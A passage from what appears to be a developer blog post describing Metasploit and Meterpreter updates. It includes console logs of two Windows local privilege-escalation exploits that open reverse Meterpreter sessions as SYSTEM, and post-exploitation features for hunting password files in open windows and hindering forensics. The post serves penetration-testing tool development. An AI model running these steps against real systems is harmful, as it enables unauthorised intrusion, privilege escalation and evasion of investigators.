</span><span class='line'>[*] Reloading module...
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on XX.XX.XX.3:4444
</span><span class='line'>[*] Launching notepad to host the exploit...
</span><span class='line'>[+] Process 1288 launched.
</span><span class='line'>[*] Reflectively injecting the exploit DLL into 1288...
</span><span class='line'>[*] Exploit injected. Injecting payload into 1288...
</span><span class='line'>[*] Payload injected. Executing exploit...
</span><span class='line'>[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
</span><span class='line'>[*] Sending stage (768512 bytes) to XX.XX.XX.3
</span><span class='line'>[*] Meterpreter session 3 opened (XX.XX.XX.3:4444 -&gt; XX.XX.XX.3:51569) at 2013-11-13 23:53:36 -0600
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: NT AUTHORITY\SYSTEM</span></code></pre></td></tr></table></div></figure>


<p>This was the first time I&rsquo;d ever worked with local exploits, and I won&rsquo;t deny that finishing it and seeing it all working made me feel like this:</p>

<p><img src="http://buffered.io/uploads/2013/12/f-yeah.gif" alt="Yeah!" /></p>

<p>(Thanks to my good friend <a href="https://twitter.com/justinsteven">Justin</a> for showing me this image.)</p>

<p>This exploit doesn&rsquo;t mess with your existing session at all, so that should continue to function as before. This exploit also supports the use of different payload types, just like every other exploit, making it a little more flexible than when it was part of <code>getsystem</code>. If you&rsquo;re interested in seeing how the module works, take a look at <a href="https://github.com/OJ/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_015_kitrap0d.rb">the source on Github</a>.</p>

<p>After this change was merged, pentesters worldwide would rejoice in the fact that they could now resume normal <code>getsystem</code> programming instead of having to worry about sessions dying and machines crashing.</p>

<p>A big shout out goes to <a href="https://twitter.com/_sinn3r">sinn3r</a> and <a href="https://twitter.com/_juan_vazquez_">Juan</a> for helping get this over the line.</p>

<h3>ppr_flatten_rec</h3>

<p>While doing the work to refactor the <a href="http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf">Reflective DLL Injection</a> functionality into a <a href="http://git-scm.com/docs/git-submodule">git submodule</a>, allowing all exploits and Meterpreter itself to share the same codebase, I had to go through existing exploits and make sure they configured to use this new submodule. <code>ppr_flatten_rec</code> was one of the two that needed updating (the other was KiTrap0D).</p>

<p>This exploit is quite nifty, though due to the nature of what it does, it can also make target systems unstable. For example, on my Windows 7 x86 machine, this exploit almost always worked, but would also make the desktop totally unusable. However, on my Windows Vista SP2 x86 box, I rarely had problems.</p>

<p>The original version of this module elevated an existing session rather than doing what all good local exploits should do and create a new session post-elevation. So while I was refactoring for submodules I decided to fix this up as well. The <a href="https://github.com/rapid7/metasploit-framework/pull/2701">result</a> is a nicer local exploit that goes like this:</p>

<figure class='code'><figcaption><span>ppr_flatten_rec Exploit in Action</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on XX.XX.XX.40:8000 
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] Sending stage (785920 bytes) to XX.XX.XX.43
</span><span class='line'>[*] Meterpreter session 1 opened (XX.XX.XX.40:8000 -&gt; XX.XX.XX.43:49234) at 2013-11-27 19:55:43 +1000
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: WIN-P73NLAJOYFH\OJ
</span><span class='line'>meterpreter &gt; background
</span><span class='line'>[*] Backgrounding session 1...
</span><span class='line'>msf exploit(handler) &gt; use exploit/windows/local/ppr_flatten_rec
</span><span class='line'>msf exploit(ppr_flatten_rec) &gt; set session 1
</span><span class='line'>session =&gt; 1
</span><span class='line'>msf exploit(ppr_flatten_rec) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on XX.XX.XX.40:4444 
</span><span class='line'>[*] Launching notepad to host the exploit...
</span><span class='line'>[+] Process 3128 launched.
</span><span class='line'>[*] Reflectively injecting the exploit DLL into 3128...
</span><span class='line'>[*] Exploit injected. Injecting payload into 3128...
</span><span class='line'>[*] Payload injected. Executing exploit...
</span><span class='line'>[*] Exploit thread executing (can take a while to run), waiting 10 sec ...
</span><span class='line'>[*] Sending stage (785920 bytes) to XX.XX.XX.43
</span><span class='line'>[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
</span><span class='line'>[*] Meterpreter session 2 opened (XX.XX.XX.40:4444 -&gt; XX.XX.XX.43:49235) at 2013-11-27 19:56:37 +1000
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: NT AUTHORITY\SYSTEM</span></code></pre></td></tr></table></div></figure>


<p>Another big shout out goes to <a href="https://twitter.com/_sinn3r">sinn3r</a> and <a href="https://twitter.com/_juan_vazquez_">Juan</a> for aiding in making my code less shitty.</p>

<h2>New Features</h2>

<p>Making Meterpreter more stable, less crashy and more reliable is always the focus of the work, but at the same time it&rsquo;s important to improve it&rsquo;s feature set, along with that of Metasploit itself. We&rsquo;ve had some nice new features and upgrades in the toolset and I&rsquo;d like to share a few of them here.</p>

<h3>IPv6 Addresses in ipconfig</h3>

<p>Work had already been done to make Windows render the IPv6 addresses on a victim machine, but there were a couple of things in the way of having them passed down to Metasploit when NICs were being parsed. [This pull request][ipv6_pr] adjusted things so that these addresses are included in the output.</p>

<p>Here&rsquo;s what it looks like on one of my Vista VMs:</p>

<figure class='code'><figcaption><span>ppr_flatten_rec Exploit in Action</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; ipconfig
</span><span class='line'>
</span><span class='line'>Interface  1
</span><span class='line'>============
</span><span class='line'>Name         : Software Loopback Interface 1
</span><span class='line'>Hardware MAC : 00:00:00:00:00:00
</span><span class='line'>MTU          : 4294967295
</span><span class='line'>IPv4 Address : 127.0.0.1
</span><span class='line'>IPv4 Netmask : 255.0.0.0
</span><span class='line'>IPv6 Address : ::1
</span><span class='line'>IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Interface 10
</span><span class='line'>============
</span><span class='line'>Name         : Intel(R) PRO/1000 MT Network Connection
</span><span class='line'>Hardware MAC : 00:0c:29:49:ae:13
</span><span class='line'>MTU          : 1480
</span><span class='line'>IPv4 Address : XX.XX.XX.52
</span><span class='line'>IPv4 Netmask : 255.255.248.0
</span><span class='line'>IPv6 Address : YYYY:YYYY:YYYY:0:5495:4239:4f53:7361
</span><span class='line'>IPv6 Netmask : ffff:ffff:ffff:ffff::
</span><span class='line'>IPv6 Address : YYYY:YYYY:YYYY:0:5d5f:b4b3:22ed:8311
</span><span class='line'>IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
</span><span class='line'>IPv6 Address : ZZZZ::ZZZZ:ZZZZ:ZZZZ:7361
</span><span class='line'>IPv6 Netmask : ffff:ffff:ffff:ffff::</span></code></pre></td></tr></table></div></figure>


<h3>Incognito v2</h3>

<p><a href="http://www.offensive-security.com/metasploit-unleashed/Fun_With_Incognito">Incognito</a> has been part of Meterpreter for a while in the form of the <code>ext_server_incognito</code> extension. This handy extension lets you do some magic with impersonation via tokens and is really useful during a penetration test. The original version of Incognito was implemented a long time, but since that first version was released a new version, <a href="https://labs.mwrinfosecurity.com/blog/2012/07/18/incognito-v2-0-released/">Incognito v2</a>, was released which fixed a bunch of bugs and added some other cool improvements. We decided to include this update in Meterpreter, and so I submitted <a href="https://github.com/rapid7/meterpreter/pull/42">this pull request</a> which included these changes (among other things) and the fantastic <a href="https://twitter.com/todb">todb</a> did me the honour of landing it in master.</p>

<h3>getenv</h3>

<p>It&rsquo;s not surprising to know that post-exploitation tasks can sometimes require access to variables that live inside the compromised machine&rsquo;s environment. However, there wasn&rsquo;t a sensible way to get access to this functionality, and as a result lots of module developers cheated and used the <code>expand_path</code> function that&rsquo;s part of the Standard API&rsquo;s <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/stdapi/fs/file.rb">File System</a> module.</p>

<p>I was talking to <a href="https://twitter.com/egyp7">Egypt</a> on IRC one morning and he mentioned that this was happening and that it really should be fixed so that environment variables are easily accessible without having to use the file system functions (which have a different semantic meaning).</p>

<p>And, lo, the <code>getenv</code> changes were made to <a href="https://github.com/rapid7/meterpreter/blob/master/source/extensions/stdapi/server/sys/config/config.c#L43">Windows Meterpreter</a>, <a href="https://github.com/rapid7/metasploit-framework/blob/master/data/meterpreter/ext_server_stdapi.py#L386">Python Meterpreter</a>, <a href="https://github.com/rapid7/metasploit-framework/blob/master/data/meterpreter/ext_server_stdapi.php#L586">PHP Meterpreter</a> and <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb#L40">Metasploit framework</a>, and all about us knew that it was good. Here it is in action (showing how tolerant it is of <code>$</code> and <code>%</code> symbols):</p>

<figure class='code'><figcaption><span>getenv in action in Windows Meterpreter on Windows 7 x64</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer        : WIN-S45GUQ5KGVK
</span><span class='line'>OS              : Windows 7 (Build 7601, Service Pack 1).
</span><span class='line'>Architecture    : x64
</span><span class='line'>System Language : en_US
</span><span class='line'>Meterpreter     : x64/win64
</span><span class='line'>meterpreter &gt; getenv DOESNOTEXIST
</span><span class='line'>[-] None of the specified environment variables were found/set.
</span><span class='line'>meterpreter &gt; getenv temp $prompt $USERNAME %WINDIR% COMSPEC %windows_tracing_flags%
</span><span class='line'>
</span><span class='line'>Environment Variables
</span><span class='line'>=====================
</span><span class='line'>
</span><span class='line'>Variable               Value
</span><span class='line'>--------               -----
</span><span class='line'>prompt                 $P$G
</span><span class='line'>windows_tracing_flags  3
</span><span class='line'>temp                   C:\Users\OJ\AppData\Local\Temp
</span><span class='line'>WINDIR                 C:\Windows
</span><span class='line'>COMSPEC                C:\Windows\system32\cmd.exe
</span><span class='line'>USERNAME               OJ</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>getenv in action in Python Meterpreter on Linux x64</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer     : ropchain
</span><span class='line'>OS           : Linux 3.11.8-200.fc19.x86_64 #1 SMP Wed Nov 13 16:29:59 UTC 2013
</span><span class='line'>Architecture : x86_64
</span><span class='line'>Meterpreter  : python/python
</span><span class='line'>meterpreter &gt; getenv PATH $PAGER %DISPLAY% TERM foo_doesnt_exist
</span><span class='line'>
</span><span class='line'>Environment Variables
</span><span class='line'>=====================
</span><span class='line'>
</span><span class='line'>Variable  Value
</span><span class='line'>--------  -----
</span><span class='line'>PATH      /home/oj/bin:/home/oj/.rvm/bin:/opt/mono/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/home/oj/.rvm/bin
</span><span class='line'>DISPLAY   :0.0
</span><span class='line'>PAGER     less
</span><span class='line'>TERM      xterm-256color</span></code></pre></td></tr></table></div></figure>


<p>Big ups to <a href="https://twitter.com/egyp7">Egypt</a> for the idea, for implementing the PHP version, and for landing the PR into master.</p>

<h3>getproxy</h3>

<p>This little gem was implemented after a chat with <a href="https://twitter.com/mubix">mubix</a> over a coffee one morning (he has a habit of feeding me ideas). He spoke about how it&rsquo;d be handy to be able to read the details of the system&rsquo;s proxy configuration in Windows, as this is used by Chrome and Internet Explorer behind the scenes. It didn&rsquo;t seem too hard, so I went ahead one evening and made it happen.</p>

<figure class='code'><figcaption><span>getproxy in action in Windows Meterpreter when no proxy is configured</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; getproxy
</span><span class='line'>Auto-detect     : No
</span><span class='line'>Auto config URL : 
</span><span class='line'>Proxy URL       : 
</span><span class='line'>Proxy Bypass    : </span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>getproxy in action in Windows Meterpreter when a proxy has been configured</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; getproxy
</span><span class='line'>Auto-detect     : Yes
</span><span class='line'>Auto config URL : http://baz:8080/foo.pac
</span><span class='line'>Proxy URL       : foo:80
</span><span class='line'>Proxy Bypass    : test;testagain;&lt;local&gt;</span></code></pre></td></tr></table></div></figure>


<p>Another hat tip goes to <a href="https://twitter.com/todb">todb</a> for landing the <a href="https://github.com/rapid7/metasploit-framework/pull/2592">pull request</a>.</p>

<h3>Kill -s</h3>

<p>Meterpreter sessions make it easy for the attacker to terminate processes via the <code>kill</code> command, however there&rsquo;s a level of protection in place in the console that is there to stop you from killing yourself. That is, if you somehow manage to pass in the <code>PID</code> of the Meterpreter session itself Metasploit will stop you. For the most part this makes sense, however there are times when you may actually want to terminate the current process.</p>

<p>One example is when <code>msfpayload</code> is used to generate an executable that contains a <code>reverse_http</code> or <code>reverse_https</code> payload. As mentioned earlier, these payloads don&rsquo;t <em>currently</em> exit cleanly when using the <code>exit</code> command (we know! we&rsquo;re on it!), and so termination of the session does happen on the attacker&rsquo;s machine but on the victim&rsquo;s machine the process continues to run. This is obviously far from ideal.</p>

<p>A short term fix was to add a <code>-s</code> option to the <code>kill</code> command which says &ldquo;please kill myself&rdquo;. Those people using either of those payloads with Meterpreter can use this to &ldquo;force kill&rdquo; the executable to prevent it from running after the session has ended. Yes, it&rsquo;s a small win, but it could prove useful and help people make forensics a little harder while we sort out the main part of the problem.</p>

<p>Note: This doesn&rsquo;t make for a clean shutdown of Metasploit sessions, for obvious reasons!</p>

<h3>Extended API extension</h3>

<p>The Extended API, or <code>extapi</code>, is an extension that was born out of the need to have more helpful functionality for post-exploitation that didn&rsquo;t really belong in the Standard API (<code>stdapi</code>). Extra functionality is always nice, but you don&rsquo;t necessarily want to add extra weight to <code>stadpi</code> when it&rsquo;s already big enough.</p>

<p>The meat of <code>extapi</code> comes from ideas that were shared with me by <a href="https://twitter.com/mubix">Mubix</a> and <a href="https://twitter.com/kernelsmith">Kernelsmith</a>, so credit where credit is due, these guys were the minds behind the extension. I just built it, which is the easy bit. The extension is new, and only has a little bit of functionality so far, but I have a goal to add a lot more very useful stuff in the future. The Metasploit pull request can be <a href="https://github.com/rapid7/metasploit-framework/pull/2602">found here</a> and the Meterpreter side is <a href="https://github.com/rapid7/meterpreter/pull/45">over here</a> if you&rsquo;d like to dive into the code.</p>

<p><a href="https://twitter.com/todb">Tod</a> posted some details about this extension on a [recent Metasploit blog post[metasploit_post_extapi] (thanks Tod!), but I&rsquo;m going to dive into the guts a little more in this post.</p>

<p><code>extapi</code> is Windows-only at this point, as the functionality that was added is Windows-specific. However, there&rsquo;s plenty of room for improvement and plenty of room for addition of features that POSIX will appreciate. If you feel compelled to get involved this is a great spot to get started.</p>

<p>To load <code>extapi</code>, do the same as you would with any other extension:</p>

<figure class='code'><figcaption><span>getproxy in action in Windows Meterpreter when a proxy has been configured</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; use extapi
</span><span class='line'>Loading extension extapi...success.</span></code></pre></td></tr></table></div></figure>


<p>And with that, let&rsquo;s take a look at the features.</p>

<h4>Window Integration</h4>

<figure class='code'><figcaption><span>Output from running &#8216;help&#8217; at the Meterpreter prompt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Extapi: Window Management Commands
</span><span class='line'>==================================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    window_enum   Enumerate all current open windows</span></code></pre></td></tr></table></div></figure>


<p>On initial inspection this feature might seem rather uninteresting, but give it a chance. The goal here was to make it possible to enumerate all the windows on the current desktop to give you a clearer view of what the user is running, and to perhaps allow for interaction with those Windows later via Railgun. Being able to enumerate child windows of a given can also prove handy in some scenarios, and so this feature was also added.</p>

<p>So why is it useful? Running <code>ps</code> on a target machine will only give you so much. You might be able to see that <code>notepad.exe</code> is running, but you didn&rsquo;t know that the user was currently editing <code>passwords.txt</code>. Window enumeration will tell you that. That little bit of extra context can really help a penetration tester focus their attack a little better, and let&rsquo;s face it, you can never have too much information when doing such tests.</p>

<p>Detailed help for the <code>window_enum</code> command looks like this:</p>

<figure class='code'><figcaption><span>Output from running &#8216;help&#8217; at the Meterpreter prompt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; window_enum -h
</span><span class='line'>
</span><span class='line'>Usage: window_enum [-h] [-p parent_window] [-u]
</span><span class='line'>
</span><span class='line'>Enumerate the windows on the target.
</span><span class='line'>
</span><span class='line'>Enumeration returns the Process ID and Window Handle for each window
</span><span class='line'>found. The Window Handle can be used for further calls to window_enum
</span><span class='line'>or the railgun API.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -h        Help banner
</span><span class='line'>    -p &lt;opt&gt;  Parent window handle, used to enumerate child windows
</span><span class='line'>    -u        Include unknown/untitled windows in the result set
</span><span class='line'>
</span><span class='line'>Note: Not all windows can be enumerated. An attempt to enumerate
</span><span class='line'>      the children of such a window will result in a failure with the
</span><span class='line'>      message "Operation failed: The parameter is incorrect."</span></code></pre></td></tr></table></div></figure>


<p>The <code>-p</code> parameter is used when you&rsquo;re interested in looking at the child windows of a given window. This can be handy when narrowing down your search for meaningful information. If it&rsquo;s omitted, all the <em>named</em> top-level windows are enumerated. Some windows, when enumerated, do not yield a window title and by default these windows are not returned in the result set. To have them included, the <code>-u</code> parameter can be used. Each window that isn&rsquo;t named will have <code>&lt;unknown&gt;</code> specified as the window title.</p>

<p>Here&rsquo;s a sample call, running on the context of the <code>SYSTEM</code> user on a Windows XP machine:</p>

<figure class='code'><figcaption><span>Output from running &#8216;help&#8217; at the Meterpreter prompt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; window_enum
</span><span class='line'>
</span><span class='line'>Top-level windows
</span><span class='line'>=================
</span><span class='line'>
</span><span class='line'>PID  Handle  Title
</span><span class='line'>---  ------  -----
</span><span class='line'>956  65646   SYSTEM AGENT COM WINDOW
</span><span class='line'>
</span><span class='line'>Total top-level Windows: 1</span></code></pre></td></tr></table></div></figure>


<p>As you can see, the <code>SYSTEM</code> user doesn&rsquo;t have many windows open, which makes sense. The context that Meterpreter is running under is the one under which the windows are enumerated. Therefore, to view the windows for a given user, the process must be running as that user. Here&rsquo;s a more interesting sample running as a user that actually has a desktop session running:</p>

<figure class='code'><figcaption><span>Output from running &#8216;help&#8217; at the Meterpreter prompt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; window_enum
</span><span class='line'>
</span><span class='line'>Top-level windows
</span><span class='line'>=================
</span><span class='line'>
</span><span class='line'>PID   Handle  Title
</span><span class='line'>---   ------  -----
</span><span class='line'>156   196894  passwords - Notepad
</span><span class='line'>288   327766  C:\WINDOWS\System32\cmd.exe
</span><span class='line'>540   65574   NetDDE Agent
</span><span class='line'>608   131170  Start Menu
</span><span class='line'>608   65780   MS_WebcheckMonitor
</span><span class='line'>608   65782   Power Meter
</span><span class='line'>608   131328  Connections Tray
</span><span class='line'>608   65728   Program Manager
</span><span class='line'>1712  196868  vmtoolsdControlWndTitle
</span><span class='line'>1712  65804   DnDControlTitle
</span><span class='line'>1712  65810   UnitySetTopWindowGroupWindow
</span><span class='line'>1712  65812   GuestHostIntegrationWindow
</span><span class='line'>1712  65800   VMSwitchUserControlTitle
</span><span class='line'>1712  65802   VMDisplayChangeControlTitle
</span><span class='line'>1744  131292  DDE Server Window
</span><span class='line'>
</span><span class='line'>Total top-level Windows: 15</span></code></pre></td></tr></table></div></figure>


<p>As you can see, it&rsquo;s possible to get more interesting information using this utility. That <code>notepad</code> instance looks like it could yield some juicy information.</p>

<p>You can also have some silly fun, like so:</p>

<figure class='code'><figcaption><span>Mass window update</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; irb
</span><span class='line'>[*] Starting IRB shell
</span><span class='line'>[*] The 'client' variable holds the meterpreter client
</span><span class='line'>
</span><span class='line'>&gt;&gt; client.extapi.window.enumerate.each {|w| client.railgun.user32.SetWindowTextA(w[:handle], "PWNED!")}</span></code></pre></td></tr></table></div></figure>


<p>And behold!</p>

<p><img src="http://buffered.io/uploads/2013/12/pwnd-desktop.png" alt="Owned Windows" /></p>

<p>This is of course a silly example, but having control of the user&rsquo;s desktop windows can prove useful. Once you know the handle of target, it&rsquo;s possible to extract more meaningful information thanks to the Railgun API.</p>

<p>You can also Rick Roll. And who doesn&rsquo;t love a good Rick Rolling?</p>

<h4>Service Integration</h4>

<p>Now, on to more serious stuff.</p>

<figure class='code'><figcaption><span>Output from running &#8216;help&#8217; at the Meterpreter prompt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Extapi: Service Management Commands
</span><span class='line'>===================================
</span><span class='line'>
</span><span class='line'>    Command        Description
</span><span class='line'>    -------        -----------
</span><span class='line'>    service_enum   Enumerate all registered Windows services
</span><span class='line'>    service_query  Query more detail about a specific Windows service</span></code></pre></td></tr></table></div></figure>


<p>Services are a common point of attack. Misconfigured or old/vulnerable services can make for easy targets for local privilege escalation. The <code>service_enum</code> command lets us take a quick glance at what services are running, and what the status is. Here&rsquo;s the detailed help:</p>

<figure class='code'><figcaption><span>Detailed help of the service_enum command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; service_enum -h
</span><span class='line'>
</span><span class='line'>Usage: service_enum [-h]
</span><span class='line'>
</span><span class='line'>Enumerate services installed on the target.
</span><span class='line'>
</span><span class='line'>Enumeration returns the Process ID, Status, and name of each installed
</span><span class='line'>service that was enumerated. The 'Int' value indicates if the service is
</span><span class='line'>able to interact with the desktop.</span></code></pre></td></tr></table></div></figure>


<p>No parameters are required to make this function tick. Here&rsquo;s some sample output:</p>

<figure class='code'><figcaption><span>Sample output of the service_enum command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
